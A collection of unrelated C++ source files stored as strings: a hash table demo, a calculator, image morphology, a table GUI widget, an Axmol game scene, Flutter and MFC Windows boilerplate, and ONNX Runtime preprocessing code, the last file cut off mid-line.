    "#include<iostream>\r\n#include<list>\r\nusing namespace std;\r\n# define size 5\r\n\r\nlist<int> hashtable[size];\r\n\r\nint hashfunc(int x)\r\n{\r\n\treturn x % size;\r\n}\r\n\r\nvoid insert(int key)\r\n{\r\n\tint index = hashfunc(key);\r\n\thashtable[index].push_back(key);\r\n}\r\n\r\nvoid delete_key(int key)\r\n{\r\n\tlist<int>::iterator i;\r\n\tint index = hashfunc(key);\r\n\tfor (i=hashtable[index].begin(); i!=hashtable[index].end();i++)\r\n\t{\r\n\t\tif (*i == key)\r\n\t\t{\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\tif (i != hashtable[index].end())\r\n\t{\r\n\t\thashtable[index].erase(i);\r\n\t\tcout << \"Key \" << key << \" deleted\" << endl;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tcout << \"Key \" << key << \" not found\" << endl;\r\n\t}\r\n}\r\n\r\nvoid display()\r\n{\r\n\tfor (int i = 0; i < size; i++)\r\n\t{\r\n\t\tcout << i;\r\n\t\tfor (auto x : hashtable[i])\r\n\t\t{\r\n\t\t\tcout << \" -> \" << x;\r\n\t\t}\r\n\t\tcout << endl;\r\n\t}\r\n}\r\n\r\nvoid main()\r\n{\r\n\tint hash_array[size] = { 11, 12, 21, 14, 15 };\r\n\tint key;\r\n\r\n\tfor (int i = 0; i < size; i++)\r\n\t{\r\n\t\tinsert(hash_array[i]);\r\n\t}\r\n\r\n\tcout << \"hashtable created: \" << endl;\r\n\r\n\tdisplay();\r\n\r\n\tcout << endl;\r\n\r\n\tcout << \"enter no to delete: \";\r\n\tcin >> key;\r\n\r\n\tdelete_key(key);\r\n\r\n\tcout << \"hashtable after deletion: \";\r\n\r\n\tcout << endl;\r\n\r\n\tdisplay();\r\n}",
    "#include \"IntegerArray.h\"\n#include <iostream>\n\nint main() {\n    for (int TEST = 0; TEST <= 10; TEST++) {\n        try {\n            IntegerArray a;\n            switch (TEST) {\n            case 0:\n                a = IntegerArray(2);\n                a.Print();\n                a[0] = 3;\n                a[1] = 5;\n                a.Print();\n                a.Resize(4);\n                a[2] = -2;\n                a.Print();\n                a.Resize(1);\n                a.Print();\n                a.InsertFirst(6);\n                a.InsertLast(-9);\n                a.Insert(45, 1);\n                a.Print();\n                if (a.Find(3))\n                    *a.Find(3) = 0;\n                a.Print();\n                break;\n            case 1:\n                a = IntegerArray(-1);\n                break;\n            case 2:\n                a = IntegerArray();\n                a.Resize(-2);\n                break;\n            case 3:\n                a = IntegerArray(3);\n                a[-1] = 2;\n                break;\n            case 4:\n                a = IntegerArray(3);\n                a[3] = 2;\n                break;\n            case 5:\n                a = IntegerArray(3);\n                a.Remove(-1);\n                break;\n            case 6:\n                a = IntegerArray(3);\n                a.Remove(3);\n                break;\n            }\n        }\n        catch (std::exception& e) {\n            std::cout << TEST << \": \" << e.what() << std::endl;\n        }\n    }\n}\n",
    "#include \"MorphologicalProcessing.h\"\n\nvoid MorphologicalProcessing::erode(const cv::Mat &source_img, cv::Mat &dest_img, const cv::Mat &kernel, int iterations)\n{\n    dest_img = source_img.clone();\n\n    int width = source_img.cols, height = source_img.rows;\n\n    for (int i = 0; i < iterations; i++)\n    {\n        cv::Mat temp = dest_img.clone();\n\n        for (int y = 0; y < height; y++)\n        {\n            for (int x = 0; x < width; x++)\n            {\n                bool erodePixel = false;\n\n                int kernelWidth = kernel.cols, kernelHeight = kernel.rows;\n\n                for (int ky = 0; ky < kernelWidth; ky++)\n                {\n                    for (int kx = 0; kx < kernelHeight; kx++)\n                    {\n                        int ny = y + ky - kernelHeight / 2;\n                        int nx = x + kx - kernelWidth / 2;\n\n                        if (ny >= 0 && ny < height && nx >= 0 && nx < width)\n                        {\n                            if (kernel.at<uchar>(ky, kx) == 1 && source_img.at<uchar>(ny, nx) == 0)\n                            {\n                                erodePixel = true;\n                                break;\n                            }\n                        }\n                    }\n\n                    if (erodePixel)\n                        break;\n                }\n\n                temp.at<uchar>(y, x) = erodePixel ? 0 : 255;\n            }\n        }\n\n        dest_img = temp;\n    }\n}\n\nvoid MorphologicalProcessing::dilate(const cv::Mat &source_img, cv::Mat &dest_img, const cv::Mat &kernel, int iterations)\n{\n    dest_img = source_img.clone();\n\n    int width = source_img.cols, height = source_img.rows;\n    cv::Mat reflKernel;\n    cv::flip(kernel, reflKernel, -1);\n\n    for (int i = 0; i < iterations; i++) {\n        cv::Mat temp = dest_img.clone();\n\n        for (int y = 0; y < height; y++) {\n            for (int x = 0; x < width; x++) {\n                bool dilatePixel = false;\n\n                int kernelWidth = kernel.cols, kernelHeight = kernel.rows;\n                \n                for (int ky = 0; ky < kernelHeight; ky++) {\n                    for (int kx = 0; kx < kernelWidth; kx++) {\n                        int ny = y - (ky - kernelHeight / 2);\n                        int nx = x - (kx - kernelWidth / 2);\n\n                        if (ny >= 0 && ny < height && nx >= 0 && nx < width) {\n                            if (reflKernel.at<uchar>(ky, kx) == 1 && source_img.at<uchar>(ny, nx) == 255) {\n                                dilatePixel = true;\n                                break;\n                            }\n                        }\n                    }\n\n                    if (dilatePixel) break;\n                }\n\n                temp.at<uchar>(y, x) = dilatePixel ? 255 : 0;\n            }\n        }\n\n        dest_img = temp;\n    }\n}\n\nvoid MorphologicalProcessing::open(const cv::Mat &source_img, cv::Mat &dest_img, const cv::Mat &kernel, int iterations) {\n    cv::Mat temp;\n    erode(source_img, temp, kernel, iterations);\n    dilate(temp, dest_img, kernel, iterations);\n}\n\nvoid MorphologicalProcessing::close(const cv::Mat &source_img, cv::Mat &dest_img, const cv::Mat &kernel, int iterations) {\n    cv::Mat temp;\n    dilate(source_img, temp, kernel, iterations);\n    erode(temp, dest_img, kernel, iterations);\n}",
    "#include \"Table.h\"\n#include<iostream>\nusing namespace std;\n\nTable::Table(int row, int col)\n\t:BasicWidget(0,0,0,0),m_rows(row),m_cols(col)\n\t,m_curPage(0),m_maxPage(0),m_extraData(0)\n{\n\tm_preBtn = new PushButton(\"\u4e0a\u4e00\u9875\");\n\tm_nextBtn = new PushButton(\"\u4e0b\u4e00\u9875\");\n\tm_firstBtn = new PushButton(\"\u9996\u9875\");\n\tm_lastBtn = new PushButton(\"\u5c3e\u9875\");\n}\n\nTable::~Table()\n{\n\tdelete m_preBtn;\n\tdelete m_nextBtn;\n\tdelete m_firstBtn;\n\tdelete m_lastBtn;\n}\n\nvoid Table::setRowCount(int row)\n{\n\tm_rows = row;\n}\n\nvoid Table::setColCount(int col)\n{\n\tm_cols = col;\n}\n\nvoid Table::setHeader(const std::string& header)\n{\n\tm_header = header;\n\t//std::cout << \"header:\" << header << std::endl;\n\tm_cols=std::count(m_header.begin(), m_header.end(), '\\t')+1;\n\t\n\t//\u6587\u5b57\u7684\u5bbd\u5ea6\u9ad8\u5ea6\n\tm_tw = ::textwidth(\"12\u670812\u65e512:12\");\n\tm_th = ::textheight(\"m_header.c_str()\");\n\n\tWidthSupply = 5;\n\tm_gridW=::textwidth(\"12\u670812\u65e512:12000000\")+WidthSupply;//\u683c\u5b50\u5bbd\u5ea6\n\tHeightSupply = 40;\n\tm_gridH=::textheight(\"m_header.c_str()\")+HeightSupply;//\u683c\u5b50\u9ad8\u5ea6,40\u662f\u989d\u5916\u589e\u9ad8\u7684\uff0c\u540e\u7eed\u4f1a\u7528\u5230\n\n\tm_w = m_gridW * m_cols;\n\tm_h = m_gridH *( m_rows);\n\n\tmiddlePut = (Window::width()-m_w)/2;//\u6846\u7684\u5c45\u4e2dx\u5750\u6807\n\n}\n\nvoid Table::setHeader02(const std::string& header)\n{\n\tm_header = header;\n\tm_cols = std::count(m_header.begin(), m_header.end(), '\\t') + 1;\n\n\tm_tw = ::textwidth(\"12\u670812\u65e512:12\");\n\tm_th = ::textheight(\"m_header.c_str()\");\n\n\tWidthSupply = 5;\n\tm_gridW = ::textwidth(\"\u5341\u4e94\u4e2a\u6c49\u5b57\u5341\u4e94\u4e2a\u6c49\u5b57\u5341\u4e94g\") + WidthSupply;//\u683c\u5b50\u5bbd\u5ea6\n\tHeightSupply = 40;\n\tm_gridH = ::textheight(\"m_header.c_str()\") + HeightSupply;//\u683c\u5b50\u9ad8\u5ea6,40\u662f\u989d\u5916\u589e\u9ad8\u7684\uff0c\u540e\u7eed\u4f1a\u7528\u5230\n\n\tm_w = m_gridW * m_cols;\n\tm_h = m_gridH * (m_rows);\n\n}\n\nvoid Table::insertData(const std::string& data)//\u5f80m_datas\u91cc\u9762\u5b58\u6570\u636e\n{\n\tm_datas.push_back(data);\n\tupdatePage();\n}\n\nvoid Table::show()\n{\n\t//outtextxy(0, 0, \"\u6309Esc\u952e\u8fd4\u56de\u4e3b\u754c\u9762...\");\n\tupdatePage();\n\tdrawTableGrid();\n\tdrawTableData();\n\tdrawHeader();\n}\nvoid Table::drawTableGrid()\n{\n\t//\u753b\u6a2a\u7ebf\n\tsetlinestyle(PS_SOLID, 4);\n\tsetlinecolor(RGB(255, 120, 0));\n\tfor (int i = 0; i < m_rows + 1; i++)\n\t{\n\t\tline(m_x, m_y + i * m_gridH, m_x + m_cols * m_gridW , m_y + i * m_gridH);\n\t}\n\t//\u753b\u7ad6\u7ebf\n\tfor (size_t i = 0; i < m_cols + 1; i++) \n\t{\n\t\tline(m_x + i * m_gridW, m_y, m_x + i * m_gridW, m_y + m_rows * m_gridH);\n\t}\n\tif (m_maxPage > 0)\n\t{\n\t\tdrawTableBottom();\n\t}\n}\n\nvoid Table::drawTableBottom()\n{\n\tstatic bool flag = false;\n\tif (!flag)\n\t{\n\t\tm_preBtn->move(m_x-210, m_h + m_y+10);\n\t\tm_nextBtn->move(m_preBtn->x() + m_preBtn->width()+2, m_preBtn->y());\n\t\tm_firstBtn->move(m_nextBtn->x() + m_nextBtn->width()+2, m_nextBtn->y());\n\t\tm_lastBtn->move(m_firstBtn->x() + m_firstBtn->width()+2, m_firstBtn->y());\n\t\t//flag = true;\n\t}\n\t\n\n\tm_preBtn->show();\n\tm_nextBtn->show();\n\tm_firstBtn->show();\n\tm_lastBtn->show();\n\t\n\tchar str[30] = { 0 };\n\tsprintf_s(str, \"\u7b2c%d\u9875/\u5171%d\u9875\", m_curPage + 1, m_maxPage + 1);\n\touttextxy(m_lastBtn->x() + m_lastBtn->width()+4, m_lastBtn->y()+8, str);\n}\n\nvoid Table::drawTableData()\n{\n\t::settextcolor(RGB(28, 107, 150));\n\t::settextstyle(20, 0, \"\u5b8b\u4f53\", 0, 0, 800, 0, 0, 0);\n\n\t//\u9632\u6b62\u8d8a\u754c\n\tif (m_rows > m_datas.size() && m_datas.size() != 0)\n\t{\n\t\tm_rows = m_datas.size();\n\t}\n\t//if (m_rows == 0 && !m_datas.empty())\n\t\t//m_rows = m_datas.size();\n\t\n\tint beginPos=m_curPage*m_rows; //\u6570\u636e\u5f00\u59cb\u7684\u4f4d\u7f6e\n\tint endPos = m_curPage * m_rows + m_rows;//\u6570\u636e\u7ed3\u675f\u4f4d\u7f6e\n\t//\u5982\u679c\u662f\u6700\u540e\u4e00\u5217 \u5c31\u53ea\u904d\u5386\u5269\u4e0b\u7684\u6570\u636e\n\tif (m_curPage == m_maxPage)\n\t{\n\t\tendPos = beginPos + m_extraData;\n\t}\n\tfor (size_t i = beginPos, r = 0;i<endPos;i++,r++)//\u884c\n\t{\n\t\tconst auto& line_data = split(m_datas[i]);\n\t\tfor (size_t k = 0; k < line_data.size(); k++) //\u5217\n\t\t{\n\t\t\tint tx = m_x + k * m_gridW+(m_gridW-::textwidth(line_data[k].c_str()))/2 ;\n\t\t\tint ty = m_y +r* m_gridH+HeightSupply/2;//40\u7684\u4e00\u534a\n\t\t\touttextxy(tx, ty, line_data[k].c_str());\n\t\t}\n\t}\n}\nvoid Table::drawHeader() \n{\n\tsetlinestyle(PS_SOLID, 4);\n\trectangle(m_x, m_y - m_gridH, m_x + m_w, m_y);\n\tfor (size_t i = 0; i < m_cols; i++)\n\t{\n\t\tline(m_x + i * m_gridW, m_y - m_gridH, m_x + i * m_gridW, m_y);\n\t}\n\tsetlinestyle(PS_SOLID, 4);\n\t//\u5206\u5272\u8868\u5934\n\tauto headers = split(m_header);\n\tfor (size_t i = 0; i < headers.size(); i++)\n\t{\n\t\tint spaceH = (m_gridW - textwidth(headers[i].c_str())) / 2;\n\t\tint spaceV = (m_gridH - textheight(headers[i].c_str())) / 2;\n\t\touttextxy(m_x + i * m_gridW + spaceH, m_y - m_gridH + spaceV, headers[i].c_str());\n\t}\n}\n\nstd::vector<std::string> Table::split(std::string str, char separator1)//\u9ed8\u8ba4\u5206\u9694\u7b26\u4e3a\u5236\u8868\u7b26\n{\n\t\n\tstd::vector<std::string> res;\n\n\tfor (size_t pos = 0; pos<100;)\n\t{\n\t\t////\u67e5\u627e\u6307\u5b9a\u5206\u5272\u5b57\u7b26\u7684\u4f4d\u7f6e 1=\u5236\u8868\u7b26 2=\u7a7a\u767d\n\t\t//int pos1 = str.find(separator1);\n\t\t//int pos2 = str.find(separator2);\n\t\t//if (pos2 != -1&&pos1!=-1)\n\t\t//{\n\t\t//\tpos = min(pos1, pos2);\n\t\t//}\n\t\t//else pos = max(pos1,pos2);\n\t\t//\u53d6\u51fa\u5b57\u7b26\u4e320-pos\n\t\tpos = str.find(separator1);\n\t\tres.push_back(str.substr(0, pos));\n\t\t//\u628a\u5269\u4e0b\u7684\u5b57\u7b26\u4e32\u4fdd\u5b58\u5230str\n\t\tstr = std::string(str.c_str()+pos+1);\n\t\t\n\t}\n\treturn res;\n\n}\n\nvoid Table::updatePage()\n{\n\tif (m_rows == 0 && !m_datas.empty())\n\t{m_rows = m_datas.size();}\n\t\n\tif (m_cols==0&& !m_datas.empty())\n\t{\n\t\tm_cols = m_datas.front().find(\"\\t\") + 1;\n\t\n\t}\n\tif (m_rows >= m_datas.size())\n\t{\n\t\tm_maxPage = 0;\n\t\tm_extraData = m_datas.size();\n\t}\n\telse\n\t{\n\t\tm_maxPage = m_datas.size() / m_rows;\n\t\tif (m_datas.size() % m_rows == ",
    "#include \"main.hpp\"\n\nvoid parseAddition() {\n\tfloat a=0, b=0;\n\tcout << \"Enter the first value: \";\n\tcin >> a;\n\tcout << \"Enter the second value: \";\n\tcin >> b;\n\tcout << a + b << endl;\n}\n\nvoid parseSubtraction() {\n\tfloat a=0, b=0;\n\tcout << \"Enter the first value: \";\n\tcin >> a;\n\tcout << \"Enter the second value: \";\n\tcin >> b;\n\tcout << a - b << endl;\n}\n\nvoid parseMultiplication() {\n\tfloat a=0, b=0;\n\tcout << \"Enter the first value: \";\n\tcin >> a;\n\tcout << \"Enter the second value: \";\n\tcin >> b;\n\tcout << a * b << endl;\n}\n\nvoid parseDivision() {\n\tfloat a=0, b=0;\n\tcout << \"Enter the first value: \";\n\tcin >> a;\n\tcout << \"Enter the second value: \";\n\tcin >> b;\n\tif(b != 0) {\n\t\tcout << a / b << endl;\n\t}\n}\n\nvoid parseExponentiation() {\n\tfloat a=0, r=0;\n\tint b=0;\n\tcout << \"Enter the first value: \";\n\tcin >> a;\n\tcout << \"Enter the second value: \";\n\tcin >> b;\n\tr=pow(a, b);\n\tcout << r << endl;\n}\n\nvoid parseSquareRoot() {\n\tfloat a=0, r=0;\n\tcout << \"Enter the value: \";\n\tcin >> a;\n\tr=sqrt(a);\n\tcout << r << endl;\n}\n\nvoid parseSine() {\n\tfloat a=0, r=0;\n\tcout << \"Enter the value: \";\n\tcin >> a;\n\tr=sin(a);\n\tcout << r << endl;\n}\n\nvoid parseCosine() {\n\tfloat a=0, r=0;\n\tcout << \"Enter the value: \";\n\tcin >> a;\n\tr=cos(a);\n\tcout << r << endl;\n}\n\nvoid parseTangent() {\n\tfloat a=0, r=0;\n\tcout << \"Enter the value: \";\n\tcin >> a;\n\tr=tan(a);\n\tcout << r << endl;\n}\n\nvoid help() {\n\tcout << \"\\n\\n\";\n\tcout << \" Tiny Calculator ------------------------------\\n\";\n\tcout << \"\\t a\\t\\t Addition of two number\\n\";\n\tcout << \"\\t m\\t\\t Subtraction of two number\\n\";\n\tcout << \"\\t u\\t\\t Multiplication of two number\\n\";\n\tcout << \"\\t d\\t\\t Division of two number\\n\";\n\tcout << \"\\t p\\t\\t Exponentiation of two number\\n\";\n\tcout << \"\\t r\\t\\t SquareRoot of a number\\n\";\n\tcout << \"\\t s\\t\\t Sine of anumber\\n\";\n\tcout << \"\\t c\\t\\t Cosine of anumber\\n\";\n\tcout << \"\\t t\\t\\t Tangent of a number\\n\";\n\tcout << \"\\t h\\t\\t Help\\n\";\n\tcout << \"\\t e\\t\\t Exit\\n\";\n\tcout << \"\\n\\n\";\n}\n\nvoid error() {\n\tcout << \"Error : Input is anonymous!\\n\";\n}\n\nint main(int argc, char** argv) {\n\tunsigned char type;\n\tbool flag=true;\n\twhile(flag) {\n\t\tcout << \"------------------\\n(h) For help\\n(e) To exit\\nEnter Your type: \";\n\t\tcin >> type;\n\t\tswitch(type) {\n\t\t\tcase 'a':\n\t\t\t\tparseAddition();\n\t\t\tbreak;\n\t\t\tcase 'm':\n\t\t\t\tparseSubtraction();\n\t\t\tbreak;\n\t\t\tcase 'u':\n\t\t\t\tparseMultiplication();\n\t\t\tbreak;\n\t\t\tcase 'd':\n\t\t\t\tparseDivision();\n\t\t\tbreak;\n\t\t\tcase 'p':\n\t\t\t\tparseExponentiation();\n\t\t\tbreak;\n\t\t\tcase 'r':\n\t\t\t\tparseSquareRoot();\n\t\t\tbreak;\n\t\t\tcase 's':\n\t\t\t\tparseSine();\n\t\t\tbreak;\n\t\t\tcase 'c':\n\t\t\t\tparseCosine();\n\t\t\tbreak;\n\t\t\tcase 't':\n\t\t\t\tparseTangent();\n\t\t\tbreak;\n\t\t\tcase 'h':\n\t\t\t\thelp();\n\t\t\tbreak;\n\t\t\tcase 'e':\n\t\t\t\tflag=false;\n\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\terror();\n\t\t\tbreak;\n\t\t}\n\t}\n\treturn 0;\n}",
    "/****************************************************************************\n Copyright (c) 2017-2018 Xiamen Yaji Software Co., Ltd.\n Copyright (c) 2019-present Axmol Engine contributors (see AUTHORS.md).\n\n https://axmolengine.github.io/\n\n Permission is hereby granted, free of charge, to any person obtaining a copy\n of this software and associated documentation files (the \"Software\"), to deal\n in the Software without restriction, including without limitation the rights\n to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n copies of the Software, and to permit persons to whom the Software is\n furnished to do so, subject to the following conditions:\n\n The above copyright notice and this permission notice shall be included in\n all copies or substantial portions of the Software.\n\n THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n THE SOFTWARE.\n ****************************************************************************/\n\n#include \"MainScene.h\"\n#include \"DebugNodes/DebugNodes.h\"\n\nUSING_NS_AX;\n\n\n// on \"init\" you need to initialize your instance\nbool MainScene::init()\n{\n    //////////////////////////////\n    // 1. super init first\n    if (!Scene::init())\n    {\n        return false;\n    }\n\n    auto visibleSize = _director->getVisibleSize();\n    auto origin = _director->getVisibleOrigin();\n    auto safeArea = _director->getSafeAreaRect();\n    auto safeOrigin = safeArea.origin;\n\n    setName(\"Axmol\");\n\n\n    /**\n        if using android Studio * click build -> Refresh Linked c++ projects before building \"Sync wont work\"\n        do same when adding new class this is because we now get .cpp an .h in wildcard format so you don't have to keep\n        add your .cpp and .h files to the CMakeLists.txt\n     **/\n\n\n\n    /** Add you SpriteSheet Name Here **/\n                                          //7704a465           0b715ae6            04b013b0            533bbf8e\n    ZipUtils::setPvrEncryptionKey(0x7704a465, 0x0b715ae6, 0x04b013b0, 0x533bbf8e);\n    SpriteFrameCache::getInstance()->addSpriteFramesWithFile(\"SpriteSheet01.plist\");\n\n    auto QTM = QuickTileMap::create();\n    QTM->LoadMap(\"Maps/Map01.tmx\");\n    addChild(QTM);\n\n    // SmartNode::ShowTree(QTM->root);\n    // DebugNodes *debug = DebugNodes::create();\n    // debug->DebugNode(this);\n\n    return true;\n}\n\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"ledcito\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/**\n * @file    ImageRecognitionOrtSessionHandlerBase.cpp\n *\n * @author  btran\n *\n * Copyright (c) organization\n *\n */\n\n#include <cassert>\n#include <cstring>\n#include <sstream>\n\n#include \"ort_utility/ort_utility.hpp\"\n\nnamespace Ort\n{\nImageRecognitionOrtSessionHandlerBase::ImageRecognitionOrtSessionHandlerBase(\n    const uint16_t numClasses,     //\n    const std::string& modelPath,  //\n    const std::optional<size_t>& gpuIdx, const std::optional<std::vector<std::vector<int64_t>>>& inputShapes)\n    : OrtSessionHandler(modelPath, gpuIdx, inputShapes)\n    , m_numClasses(numClasses)\n    , m_classNames()\n{\n    if (numClasses <= 0) {\n        throw std::runtime_error(\"Number of classes must be more than 0\\n\");\n    }\n\n    m_classNames.reserve(m_numClasses);\n    for (uint16_t i = 0; i < m_numClasses; ++i) {\n        m_classNames.emplace_back(std::to_string(i));\n    }\n}\n\nImageRecognitionOrtSessionHandlerBase::~ImageRecognitionOrtSessionHandlerBase()\n{\n}\n\nvoid ImageRecognitionOrtSessionHandlerBase::initClassNames(const std::vector<std::string>& classNames)\n{\n    if (classNames.size() != m_numClasses) {\n        throw std::runtime_error(\"Mismatch number of classes\\n\");\n    }\n\n    m_classNames = classNames;\n}\n\nvoid ImageRecognitionOrtSessionHandlerBase::preprocess(float* dst,                         //\n                                                       const unsigned char* src,           //\n                                                       const int64_t targetImgWidth,       //\n                                                       const int64_t targetImgHeight,      //\n                                                       const int numChannels,              //\n                                                       const std::vector<float>& meanVal,  //\n                                                       const std::vector<float>& stdVal) const\n{\n    if (!meanVal.empty() && !stdVal.empty()) {\n        assert(meanVal.size() == stdVal.size() && meanVal.size() == static_cast<std::size_t>(numChannels));\n    }\n\n    int64_t dataLength = targetImgHeight * targetImgWidth * numChannels;\n\n    memcpy(dst, reinterpret_cast<const float*>(src), dataLength);\n\n    if (!meanVal.empty() && !stdVal.empty()) {\n        for (int i = 0; i < targetImgHeight; ++i) {\n            for (int j = 0; j < targetImgWidth; ++j) {\n                for (int c = 0; c < numChannels; ++c) {\n                    dst[c * targetImgHeight * targetImgWidth + i * targetImgWidth + j] =\n                        (src[i * targetImgWidth * numChannels + j * numChannels + c] / 255.0 - meanVal[c]) / stdVal[c];\n                }\n            }\n        }\n    } else {\n        for (int i = 0; i < targetImgHeight; ++i) {\n            for (int j = 0; j < targetImgWidth; ++j) {\n                for (int c = 0; c < numChannels; ++c) {\n                    dst[c * targetImgHeight * targetImgWidth + i * targetImgWidth + j] =\n                        src[i * targetImgWidth * numChannels + j * numChannels + c] / 255.0;\n                }\n            }\n        }\n    }\n}\n}  // namespace Ort\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flappy_cock\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\r\n// FileDetailsDlg.cpp : implementation file\r\n//\r\n\r\n#include \"pch.h\"\r\n#include \"framework.h\"\r\n#include \"FileDetails.h\"\r\n#include \"FileDetailsDlg.h\"\r\n#include \"afxdialogex.h\"\r\n\r\n#ifdef _DEBUG\r\n#define new DEBUG_NEW\r\n#endif\r\n\r\n\r\n// CAboutDlg dialog used for App About\r\n\r\nclass CAboutDlg : public CDialogEx\r\n{\r\npublic:\r\n\tCAboutDlg();\r\n\r\n\t// Dialog Data\r\n#ifdef AFX_DESIGN_TIME\r\n\tenum { IDD = IDD_ABOUTBOX };\r\n#endif\r\n\r\nprotected:\r\n\tvirtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support\r\n\r\n\t// Implementation\r\nprotected:\r\n\tDECLARE_MESSAGE_MAP()\r\n};\r\n\r\nCAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)\r\n{\r\n}\r\n\r\nvoid CAboutDlg::DoDataExchange(CDataExchange* pDX)\r\n{\r\n\tCDialogEx::DoDataExchange(pDX);\r\n}\r\n\r\nBEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)\r\nEND_MESSAGE_MAP()\r\n\r\n\r\nCFileDetailsDlg::CFileDetailsDlg(CWnd* pParent /*=nullptr*/)\r\n\t: CDialogEx(IDD_FILEDETAILS_DIALOG, pParent)\r\n{\r\n\tm_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);\r\n}\r\n\r\nvoid CFileDetailsDlg::DoDataExchange(CDataExchange* pDX)\r\n{\r\n\tCDialogEx::DoDataExchange(pDX);\r\n\tDDX_Control(pDX, IDC_PATH_BROWSER, folder_browser_);\r\n\tDDX_Control(pDX, IDC_FILE_NAME, file_name_);\r\n\tDDX_Control(pDX, IDC_LIST, file_list_);\r\n}\r\n\r\nBEGIN_MESSAGE_MAP(CFileDetailsDlg, CDialogEx)\r\n\tON_WM_SYSCOMMAND()\r\n\tON_WM_PAINT()\r\n\tON_WM_QUERYDRAGICON()\r\n\tON_BN_CLICKED(IDC_SEARCH_BUTTON, &CFileDetailsDlg::OnBnClickedSearchButton)\r\n\tON_EN_CHANGE(IDC_PATH_BROWSER, &CFileDetailsDlg::OnEnChangePathBrowser)\r\nEND_MESSAGE_MAP()\r\n\r\n\r\n// CFileDetailsDlg message handlers\r\n\r\nBOOL CFileDetailsDlg::OnInitDialog()\r\n{\r\n\tCDialogEx::OnInitDialog();\r\n\r\n\t// Add \"About...\" menu item to system menu.\r\n\r\n\t// IDM_ABOUTBOX must be in the system command range.\r\n\tASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);\r\n\tASSERT(IDM_ABOUTBOX < 0xF000);\r\n\r\n\tCMenu* pSysMenu = GetSystemMenu(FALSE);\r\n\tif (pSysMenu != nullptr)\r\n\t{\r\n\t\tBOOL bNameValid;\r\n\t\tCString strAboutMenu;\r\n\t\tbNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);\r\n\t\tASSERT(bNameValid);\r\n\t\tif (!strAboutMenu.IsEmpty())\r\n\t\t{\r\n\t\t\tpSysMenu->AppendMenu(MF_SEPARATOR);\r\n\t\t\tpSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);\r\n\t\t}\r\n\t}\r\n\r\n\t// Set the icon for this dialog.  The framework does this automatically\r\n\t//  when the application's main window is not a dialog\r\n\tSetIcon(m_hIcon, TRUE);\t\t\t// Set big icon\r\n\tSetIcon(m_hIcon, FALSE);\t\t// Set small icon\r\n\r\n\t// TODO: Add extra initialization here\r\n\tfile_list_.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);\r\n\tfile_list_.InsertColumn(0, _T(\"Name\"), 0, 100);\r\n\tfile_list_.InsertColumn(1, _T(\"Size\"), 0, 100);\r\n\tfile_list_.InsertColumn(2, _T(\"Owner\"), 0, 100);\r\n\tfile_list_.InsertColumn(3, _T(\"Path\"), 0, 300);\r\n\tfile_list_.InsertColumn(4, _T(\"Time to 